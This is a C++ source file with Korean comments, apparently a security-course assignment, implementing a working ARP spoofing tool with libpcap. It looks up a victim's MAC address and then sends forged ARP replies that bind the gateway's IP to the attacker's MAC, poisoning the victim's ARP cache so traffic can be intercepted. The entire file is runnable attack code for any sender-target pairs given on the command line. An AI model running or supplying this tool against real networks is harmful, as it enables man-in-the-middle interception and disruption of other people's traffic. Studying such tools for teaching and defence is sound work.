#include <cstdio>        // 표준 입출력
#include <pcap.h>        // 패킷 캡처 라이브러리
#include <net/if.h>      // ifreq 구조체 //MAC주소 가져오기 위한 헤더 //struct ifreq 구조체 정의용
#include <sys/ioctl.h>   // ioctl 함수 //디바이스 제어를 위한 시스템 콜 인터페이스
#include <unistd.h>      // close 함수
#include "ethhdr.h"      // Ethernet 헤더 구조체
#include "arphdr.h"      // ARP 헤더 구조체
#include "ip.h"          // IP 주소 클래스
#include "mac.h"         // MAC 주소 클래스

// ARP 패킷의 구조체 정의 (Ethernet + ARP 헤더)
#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;        // Ethernet 헤더
    ArpHdr arp_;        // ARP 헤더
};
#pragma pack(pop)

// 프로그램 사용법 출력 함수
void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// 자신의 MAC 주소를 가져오는 함수
Mac get_my_mac(const char* dev) {
    struct ifreq ifr;
    // 네트워크 소켓 생성
    int fd = socket(AF_INET, SOCK_DGRAM, 0);

    if (fd < 0) {
        fprintf(stderr, "Cannot open socket\n");
        return Mac::nullMac();
    }

    // 인터페이스 이름 설정
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    // ioctl을 사용하여 MAC 주소 요청
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "Cannot get MAC address for %s\n", dev);
        close(fd);
        return Mac::nullMac();
    }

    close(fd);
    // MAC 주소 반환
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

// Sender의 MAC 주소를 ARP를 통해 알아내는 함수
Mac get_sender_mac(pcap_t* pcap, Mac my_mac, Ip sender_ip) {
    EthArpPacket request_packet;

    // Ethernet 헤더 구성
    request_packet.eth_.dmac_ = Mac::broadcastMac();    // 목적지: 브로드캐스트
    request_packet.eth_.smac_ = my_mac;                 // 출발지: 내 MAC
    request_packet.eth_.type_ = htons(EthHdr::Arp);     // 타입: ARP

    // ARP 헤더 구성
    request_packet.arp_.hrd_ = htons(ArpHdr::ETHER);    // 하드웨어 타입: Ethernet
    request_packet.arp_.pro_ = htons(EthHdr::Ip4);      // 프로토콜: IPv4
    request_packet.arp_.hln_ = Mac::Size;               // 하드웨어 주소 길이: 6
    request_packet.arp_.pln_ = Ip::Size;                // 프로토콜 주소 길이: 4
    request_packet.arp_.op_ = htons(ArpHdr::Request);   // 작업: Request
    request_packet.arp_.smac_ = my_mac;                 // 출발지 MAC
    request_packet.arp_.sip_ = htonl(Ip("0.0.0.0"));    // 출발지 IP
    request_packet.arp_.tmac_ = Mac::nullMac();         // 목적지 MAC (알 수 없음)
    request_packet.arp_.tip_ = htonl(sender_ip);        // 목적지 IP

    // ARP Request 패킷 전송
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&request_packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return Mac::nullMac();
    }

    // ARP Reply 패킷 수신 대기
    struct pcap_pkthdr* header;
    const u_char* packet;
    while (true) {
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;                        // 타임아웃: 다시 시도
        if (res == -1 || res == -2) return Mac::nullMac(); // 에러 발생

        // 받은 패킷을 EthArpPacket 구조체로 변환
        EthArpPacket* reply = (EthArpPacket*)packet;

        // ARP Reply 패킷인지 확인
        if (ntohs(reply->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(reply->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(reply->arp_.sip_) == sender_ip)
            return reply->arp_.smac_;                   // Sender의 MAC 주소 반환
    }
}

// ARP Spoofing 패킷을 전송하는 함수
void send_arp_spoof(pcap_t* pcap, Mac my_mac, Mac sender_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket packet;

    // Ethernet 헤더 구성
    packet.eth_.dmac_ = sender_mac;     // 목적지: Sender의 MAC
    packet.eth_.smac_ = my_mac;         // 출발지: 내 MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    // ARP 헤더 구성 (Reply 패킷)
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;         // 출발지 MAC: 내 MAC
    packet.arp_.sip_ = htonl(target_ip); // 출발지 IP: 위조된 게이트웨이 IP
    packet.arp_.tmac_ = sender_mac;      // 목적지 MAC: Sender의 MAC
    packet.arp_.tip_ = htonl(sender_ip); // 목적지 IP: Sender의 IP

    // Spoofing 패킷 전송
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

int main(int argc, char* argv[]) {
    // 인자 개수 확인
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    // 네트워크 인터페이스 설정
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    // pcap 초기화
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    // 자신의 MAC 주소 획득
    Mac my_mac = get_my_mac(dev);
    if (my_mac.isNull()) {
        fprintf(stderr, "Failed to get my MAC address\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    // 모든 sender-target 쌍에 대해 ARP Spoofing 수행
    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]);     // Sender의 IP
        Ip target_ip = Ip(argv[i+1]);   // Target(게이트웨이)의 IP

        // Sender의 MAC 주소 획득
        Mac sender_mac = get_sender_mac(pcap, my_mac, sender_ip);
        if (sender_mac.isNull()) {
            fprintf(stderr, "Failed to get sender MAC\n");
            continue;
        }

        // ARP Spoofing 실행
        send_arp_spoof(pcap, my_mac, sender_mac, sender_ip, target_ip);
    }

    // 자원 정리
    pcap_close(pcap);
    return 0;
}
